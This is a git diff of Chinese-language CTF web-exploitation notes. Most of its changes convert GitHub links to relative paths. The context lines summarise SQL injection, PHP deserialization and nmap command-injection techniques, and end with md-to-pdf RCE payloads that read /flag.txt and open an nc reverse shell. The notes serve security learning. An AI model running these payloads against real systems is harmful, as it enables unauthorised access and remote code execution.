@@ -47,7 +47,7 @@
     - python flask(Werkzeug) password encryption破解。这类hash以`pbkdf2:sha256:600000`开头。有现成的破解工具:[Werkzeug-Cracker](https://github.com/AnataarXVI/Werkzeug-Cracker)
 - [bbsqli](https://kashmir54.github.io/ctfs/L3akCTF2024)
     - 一个挺有意思的sql注入挑战。注入出现在username，要求注入sql语句将flag从email字段带出，且语句查询出的用户名等于username。有点唬人的成分在，只需要提前将构造好的sql语句作为用户名注册即可。wp作者使用了`INNER JOIN...on...`和LIKE语句。不过官方解法更简单，直接内嵌一个sql语句即可（subquery？）: **bbsqli**
-- [User #1](https://j4ck4l-24.github.io/2024/06/12/BCACTF_5.0_Writeup/)
+- [User #1](https://j4ck4l-24.github.io/2024/06/12/BCACTF_5.0_Writeup)
     - sqlite在update语句处的注入。包含：获取表名，字段名，表结构，修改字段等。修改时要注意`INTEGER PRIMARY KEY`，这类key必须是独特的，不能和其他的重复。但没有规定必须是递增的
     - `FOREIGN KEY(id) REFERENCES users(id) ON UPDATE CASCADE`表示修改users表的id也会修改当前表的id
     - 发现一个更简洁的做法： https://docs.google.com/document/d/1WaPoR1qaCXB-iLPM8jFbspiyjFN1rbAs7ij67T9HDQI/edit 。update时可以直接`id=id-1`
@@ -895,27 +895,27 @@ for i in files:
 
 题目及来源：[[强网杯 2019]高明的黑客](https://blog.csdn.net/qq_51684648/article/details/120167176)
 
-19. php extract变量覆盖+反序列化逃逸漏洞。例题:[[安洵杯 2019]easy_serialize_php](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php.md)
+19. php extract变量覆盖+反序列化逃逸漏洞。例题:[[安洵杯 2019]easy_serialize_php](../../CTF/BUUCTF/Web/[安洵杯%202019]easy_serialize_php.md)
 
-20. python unicodedata.numeric 漏洞。例题：[[ASIS 2019]Unicorn shop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BASIS%202019%5DUnicorn%20shop.md)
+20. python unicodedata.numeric 漏洞。例题：[[ASIS 2019]Unicorn shop](../../CTF/BUUCTF/Web/[ASIS%202019]Unicorn%20shop.md)
 
-21. php魔术方法：[官方文档](https://www.php.net/manual/zh/language.oop5.magic.php)。例题：[[MRCTF2020]Ezpop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5DEzpop.md)
+21. php魔术方法：[官方文档](https://www.php.net/manual/zh/language.oop5.magic.php)。例题：[[MRCTF2020]Ezpop](../../CTF/BUUCTF/Web/[MRCTF2020]Ezpop.md)
 
-22. php [->,=>和::符号详解](https://segmentfault.com/a/1190000008600674)。
+22. php [->,=>和::符号详解](https://segmentfault.com/a/1190000008600674)
 
-23. 命令注入的nmap利用：-oG选项写shell并绕过php escapeshellarg和escapeshellcmd函数。例题：[[BUUCTF 2018]Online Tool](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBUUCTF%202018%5DOnline%20Tool.md)
+23. 命令注入的nmap利用：-oG选项写shell并绕过php escapeshellarg和escapeshellcmd函数。例题：[[BUUCTF 2018]Online Tool](../../CTF/BUUCTF/Web/[BUUCTF%202018]Online%20Tool.md)
 
 24. [php特殊标签绕过滤](https://www.cnblogs.com/jinqi520/p/11417365.html)
-25. php利用数学函数构造任意shell。例题：[[CISCN 2019 初赛]Love Math](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math.md)
+25. php利用数学函数构造任意shell。例题：[[CISCN 2019 初赛]Love Math](../../CTF/BUUCTF/Web/[CISCN%202019%20初赛]Love%20Math.md)
 26. 当题目有提到“检查ip”，“只有我自己……”等有关获取ip的内容时，可以考虑是否在xff上做了手脚，比如我们能把xff改为127.0.0.1来伪造本机，甚至是执行模板注入。例题:[[MRCTF2020]PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
 27. flag可能会出现在phpinfo界面的Environment里，有时候是因为出题人配置错误，有时候就是这么设计的。例题：[[NPUCTF2020]ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
 28. sql注入。
-- 在information_schem被ban后的替代注入+[无列名注入](https://blog.csdn.net/qq_45521281/article/details/106647880)。例题：[[SWPU2019]Web1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSWPU2019%5DWeb1.md)
-- updatexml报错注入。例题:[HardSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/HardSQL.md)
-- 堆叠注入+符号`||`的利用。例题:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
-- 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
+- 在information_schem被ban后的替代注入+[无列名注入](https://blog.csdn.net/qq_45521281/article/details/106647880)。例题：[[SWPU2019]Web1](../../CTF/BUUCTF/Web/[SWPU2019]Web1.md)
+- updatexml报错注入。例题:[HardSQL](../../CTF/BUUCTF/Web/HardSQL.md)
+- 堆叠注入+符号`||`的利用。例题:[EasySQL](../../CTF/BUUCTF/Web/EasySQL.md)
+- 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](../../CTF/BUUCTF/Web/BabySQli.md)
     - 当过滤太多，无法获取数据库中账号信息但需要登录时使用。或者当数据库里压根就没有信息但仍需要登录时使用。如果是后者，也可以去sqlite_master里随便查出信息来用:`union select rootpage, type, name from sqlite_master --`，因为sqlite_master里一定是有值的
-- 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
+- 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](../../CTF/BUUCTF/Web/[极客大挑战%202019]FinalSQL.md)
   - 在这道题的基础上改动，使其成为通用的mysql布尔盲注脚本。当然改一下if语句的内容也能做延时注入（时间盲注）脚本。
 ```python
 import requests
@@ -3326,7 +3326,7 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 - 如果用ngrok host网站时得到 `No 'Access-Control-Allow-Origin' header is present on the requested resource.`报错，可以在启动ngrok时加上`--request-header-add "Access-Control-Allow-Origin: *"`选项，或者在网站本身加上`Access-Control-Allow-Origin` header
 275. [cps remastered](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/web/cps),[wp](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/cps-remastered)
 - insert语句处的sql注入。无错误回显所以无法报错注入爆出信息。但是可以利用LIKE语句从数据库里拿出数据后在注册的用户名处回显
-    - 如果有update权限的话甚至可以把flag提取到password字段 https://ireland.re/posts/AmateursCTF/
+    - 如果有update权限的话甚至可以把flag提取到password字段 https://ireland.re/posts/AmateursCTF
 276. markdown to pdf(md-to-pdf) RCE: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
 - 读文件payload：`((require("child_process")).execSync("cat /flag.txt"))`,`((require("fs")).readFileSync("/flag.txt"))`
 - 反弹shell payload:`((require("child_process")).execSync("nc ip port -e /bin/sh"))`
